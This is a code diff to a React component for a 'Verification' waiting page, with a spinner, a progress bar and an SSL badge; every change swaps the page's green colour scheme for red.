@@ -99,7 +99,7 @@ export function WaitClient({ sessionId }: Props) {
     return (
       <div className="flex min-h-[100dvh] items-center justify-center">
         <div className="flex justify-center py-16">
-          <div className="size-12 animate-spin rounded-full border-4 border-[#16A34A]/30 border-t-[#16A34A]" />
+          <div className="size-12 animate-spin rounded-full border-4 border-[#DF0000]/30 border-t-[#DF0000]" />
         </div>
       </div>
     );
@@ -107,8 +107,8 @@ export function WaitClient({ sessionId }: Props) {
 
   return (
     <div className="relative z-50 pak-page-shell min-h-screen flex-col overflow-hidden">
-      <div className="absolute left-[-12%] top-[-10%] h-[420px] w-[420px] rounded-full bg-[#AAD84A]/10 blur-[110px]" />
-      <div className="absolute bottom-[-14%] right-[-8%] h-[420px] w-[420px] rounded-full bg-[#129C4F]/10 blur-[120px]" />
+      <div className="absolute left-[-12%] top-[-10%] h-[420px] w-[420px] rounded-full bg-[#FF453A]/10 blur-[110px]" />
+      <div className="absolute bottom-[-14%] right-[-8%] h-[420px] w-[420px] rounded-full bg-[#DF0000]/10 blur-[120px]" />
 
       <main className="flex w-full flex-col items-center justify-start p-4 pt-0">
         {!sessionId ? (
@@ -134,13 +134,13 @@ export function WaitClient({ sessionId }: Props) {
                 />
               </div>
 
-              <div className="mx-auto flex w-full max-w-[560px] flex-col items-center rounded-[28px] border border-[#AAD84A]/30 bg-[radial-gradient(circle_at_top,rgba(170,216,74,0.14),transparent_55%),linear-gradient(180deg,rgba(3,40,26,0.96),rgba(7,22,15,0.98))] px-6 py-8 shadow-[inset_0_1px_0_rgba(214,243,106,0.08)]">
+              <div className="mx-auto flex w-full max-w-[560px] flex-col items-center rounded-[28px] border border-[#FF453A]/30 bg-[radial-gradient(circle_at_top,rgba(255,69,58,0.14),transparent_55%),linear-gradient(180deg,rgba(3,40,26,0.96),rgba(7,22,15,0.98))] px-6 py-8 shadow-[inset_0_1px_0_rgba(255,69,58,0.08)]">
                 <div className="relative mb-6 flex h-28 w-28 items-center justify-center">
-                  <div className="absolute inset-0 rounded-full border border-[#AAD84A]/20" />
-                  <div className="absolute inset-[10px] rounded-full border border-[#AAD84A]/20" />
-                  <div className="absolute inset-0 animate-spin rounded-full border-[3px] border-transparent border-t-[#AAD84A] border-r-[#D6F36A]" style={{ animationDuration: "1.7s" }} />
-                  <div className="absolute inset-[20px] rounded-full bg-[#AAD84A]/12 blur-md" />
-                  <svg className="relative z-10 h-11 w-11 text-[#AAD84A]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <div className="absolute inset-0 rounded-full border border-[#FF453A]/20" />
+                  <div className="absolute inset-[10px] rounded-full border border-[#FF453A]/20" />
+                  <div className="absolute inset-0 animate-spin rounded-full border-[3px] border-transparent border-t-[#FF453A] border-r-[#FF453A]" style={{ animationDuration: "1.7s" }} />
+                  <div className="absolute inset-[20px] rounded-full bg-[#FF453A]/12 blur-md" />
+                  <svg className="relative z-10 h-11 w-11 text-[#FF453A]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" />
                     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="m8.8 11.8 2.1 2.1 4.5-4.7" />
                   </svg>
@@ -153,13 +153,13 @@ export function WaitClient({ sessionId }: Props) {
                 </div>
 
                 <div className="w-full">
-                  <div className="mb-2 flex items-center justify-between text-[11px] font-bold uppercase tracking-[0.14em] text-[#D6F36A]/85">
+                  <div className="mb-2 flex items-center justify-between text-[11px] font-bold uppercase tracking-[0.14em] text-[#FF453A]/85">
                     <span>Verification</span>
                     <span>{Math.round(progressWidth)}%</span>
                   </div>
-                  <div className="h-3 overflow-hidden rounded-full border border-[#AAD84A]/30 bg-black/30">
+                  <div className="h-3 overflow-hidden rounded-full border border-[#FF453A]/30 bg-black/30">
                     <div
-                      className="relative h-full rounded-full bg-[linear-gradient(90deg,#129C4F_0%,#AAD84A_60%,#D6F36A_100%)] transition-all duration-1000 ease-in-out"
+                      className="relative h-full rounded-full bg-[linear-gradient(90deg,#DF0000_0%,#FF453A_60%,#FF453A_100%)] transition-all duration-1000 ease-in-out"
                       style={{ width: `${progressWidth}%` }}
                     >
                       <div className="absolute inset-y-0 right-0 w-16 bg-white/30 blur-md" />
@@ -168,7 +168,7 @@ export function WaitClient({ sessionId }: Props) {
                 </div>
 
                 <div className="mt-8 pak-form-security justify-center text-center">
-                  <svg className="h-8 w-8 shrink-0 text-[#AAD84A]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
+                  <svg className="h-8 w-8 shrink-0 text-[#FF453A]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                     <path d="M12 15v2m-6 4h12a2 2 0 0 0 2-2v-6a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2Zm10-10V7a4 4 0 0 0-8 0v4h8Z" strokeLinecap="round" strokeLinejoin="round" />
                   </svg>
                   <span>256-bit SSL encryption active</span>
